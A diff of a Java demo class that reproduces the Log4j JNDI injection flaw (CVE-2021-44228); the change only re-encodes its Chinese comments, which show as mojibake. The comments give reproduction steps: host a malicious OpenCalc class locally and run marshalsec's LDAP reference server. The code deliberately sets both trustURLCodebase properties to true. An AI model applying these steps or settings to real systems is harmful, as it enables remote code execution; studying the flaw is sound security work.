@@ -6,28 +6,28 @@ import org.apache.logging.log4j.Logger;
 /**
  * @author guoxw
  * @Description TODO
- * @createTime 2021Äê12ÔÂ28ÈÕ 15:47:00
+ * @createTime 2021å¹´12æœˆ28æ—¥ 15:47:00
  */
 public class CveDemo {
 
     static Logger logger = LogManager.getLogger(CveDemo.class);
 
     /**
-     * ¸´ÏÖ²½Öè
+     * å¤ç°æ­¥éª¤
      * <p>
-     * 1¡¢±àÒë¶ñÒâ´úÂëOpenCalc.java£¬½«classÎÄ¼ş·Åµ½·şÎñÆ÷ÉÏ£¬Ìá¹©Ò»¸öÏÂÔØÁ´½Ó£¬Èç£ºhttp://127.0.0.1:18080/file/OpenCalc.class
-     * 2¡¢´î½¨LDAP·şÎñ£¬¿ÉÒÔÊ¹ÓÃ¿ªÔ´µÄ³ÌĞò´î½¨£ºhttps://github.com/mbechler/marshalsec
-     * 1£©¿ËÂ¡´úÂë
-     * 2£©maven´ò°ü£ºmvn clean package -DskipTests
-     * 3£©Ö´ĞĞ£ºjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:18080/file/#OpenCalc 1099
-     * 3¡¢ÒıÈëlog4j2 2.15.0ÒÔ¼°Ö®Ç°µÄ°æ±¾£¬Ö´ĞĞ±¾·½·¨
+     * 1ã€ç¼–è¯‘æ¶æ„ä»£ç OpenCalc.javaï¼Œå°†classæ–‡ä»¶æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œæä¾›ä¸€ä¸ªä¸‹è½½é“¾æ¥ï¼Œå¦‚ï¼šhttp://127.0.0.1:18080/file/OpenCalc.class
+     * 2ã€æ­å»ºLDAPæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨å¼€æºçš„ç¨‹åºæ­å»ºï¼šhttps://github.com/mbechler/marshalsec
+     * 1ï¼‰å…‹éš†ä»£ç 
+     * 2ï¼‰mavenæ‰“åŒ…ï¼šmvn clean package -DskipTests
+     * 3ï¼‰æ‰§è¡Œï¼šjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:18080/file/#OpenCalc 1099
+     * 3ã€å¼•å…¥log4j2 2.15.0ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œæ‰§è¡Œæœ¬æ–¹æ³•
      *
      * @param args
      */
     public static void main(String[] args) {
-        // Èç¹ûÊ¹ÓÃµÍ°æ±¾µÄ jdk£¬trustURLCodebase Ä¬ÈÏ¾ÍÊÇ true£¬´æÔÚ JNDI ×¢ÈëÂ©¶´¡£¶øºóÀ´ Java ĞŞ¸´ÁË¸ÃÂ©¶´£¬½«²ÎÊıÄ¬ÈÏÖµÉèÖÃÎª false£º
-        // JDK 6u141¡¢7u131¡¢8u121 Ö®ºó£ºÔö¼ÓÁË com.sun.jndi.rmi.object.trustURLCodebase Ñ¡Ïî£¬Ä¬ÈÏÎª false£¬½ûÖ¹ RMI ºÍ CORBA Ğ­ÒéÊ¹ÓÃÔ¶³Ì codebase µÄÑ¡Ïî£¬Òò´Ë RMI ºÍ CORBA ÔÚÒÔÉÏµÄ JDK °æ±¾ÉÏÒÑ¾­ÎŞ·¨´¥·¢¸ÃÂ©¶´£¬µ«ÒÀÈ»¿ÉÒÔÍ¨¹ıÖ¸¶¨ URI Îª LDAP Ğ­ÒéÀ´½øĞĞ JNDI ×¢Èë¹¥»÷¡£
-        // JDK 6u211¡¢7u201¡¢8u191Ö®ºó£ºÔö¼ÓÁË com.sun.jndi.ldap.object.trustURLCodebase Ñ¡Ïî£¬Ä¬ÈÏÎª false£¬½ûÖ¹ LDAP Ğ­ÒéÊ¹ÓÃÔ¶³Ì codebase µÄÑ¡Ïî£¬°Ñ LDAP Ğ­ÒéµÄ¹¥»÷Í¾¾¶Ò²¸ø½ûÁË¡£
+        // å¦‚æœä½¿ç”¨ä½ç‰ˆæœ¬çš„ jdkï¼ŒtrustURLCodebase é»˜è®¤å°±æ˜¯ trueï¼Œå­˜åœ¨ JNDI æ³¨å…¥æ¼æ´ã€‚è€Œåæ¥ Java ä¿®å¤äº†è¯¥æ¼æ´ï¼Œå°†å‚æ•°é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼š
+        // JDK 6u141ã€7u131ã€8u121 ä¹‹åï¼šå¢åŠ äº† com.sun.jndi.rmi.object.trustURLCodebase é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢ RMI å’Œ CORBA åè®®ä½¿ç”¨è¿œç¨‹ codebase çš„é€‰é¡¹ï¼Œå› æ­¤ RMI å’Œ CORBA åœ¨ä»¥ä¸Šçš„ JDK ç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®š URI ä¸º LDAP åè®®æ¥è¿›è¡Œ JNDI æ³¨å…¥æ”»å‡»ã€‚
+        // JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº† com.sun.jndi.ldap.object.trustURLCodebase é€‰é¡¹ï¼Œé»˜è®¤ä¸º falseï¼Œç¦æ­¢ LDAP åè®®ä½¿ç”¨è¿œç¨‹ codebase çš„é€‰é¡¹ï¼ŒæŠŠ LDAP åè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
 
